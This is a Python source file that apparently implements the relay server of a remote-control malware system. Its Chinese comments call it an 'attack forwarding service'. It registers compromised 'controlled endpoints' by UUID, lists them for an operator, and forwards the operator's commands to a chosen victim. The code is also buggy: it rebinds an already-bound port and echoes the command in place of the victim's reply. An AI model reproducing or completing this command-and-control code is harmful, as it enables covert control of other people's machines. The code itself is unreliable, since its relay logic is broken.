import time

import socket
#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

def get_time(userlist):
	zlis = []
	for key, value in userlist.items():   
		a = []
		a.append(key)
		a.append(value)
		a='yicengfenli'.join(a)
		zlis.append(a)

	zlis='ercengfenli'.join(zlis)
	return zlis


print("攻击转发服务启动！")
user_list = {}

while True:

	cli, addr = sock.accept()
	print("\n\n客户端接入！")
	print(addr)

	#接收模式识别
	mod = cli.recv(2048).decode()


	if mod == "heart":
		cli.sendall("my".encode())
		print("被控端接入！")
		timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
		print(timenow)
		uuid = cli.recv(2048).decode()

		user_list[uuid] = timenow

		cli.sendall("stop".encode())

	if mod == "ctrl":
		#发送用户时间表
		data = get_time(user_list)
		cli.sendall(data.encode())
		user = cli.recv(2048).decode()


		while True:

			sock2 = socket.socket()
			#绑定主机和端口
			sock2.bind((host, port))
			#开始监听
			sock2.listen(5)
			#对话循环
			while True:
				cli2, addr = sock2.accept()
				mod = cli2.recv(2048).decode()
				cli2.sendall("my".encode())
				uuid = cli2.recv(2048).decode()

				if uuid != user:
					cli2.sendall("stop".encode())
				else:
					cli2.sendall("start".encode())
					break
			break

		cli.sendall("online".encode())
		time.sleep(1)
		while True:
			#攻击转发模块
			cmd = cli.recv(2048).decode()
			cli2.sendall(cmd.encode())
			re = cli2.recv(2048).decode()
			cli.sendall(cmd.encode())
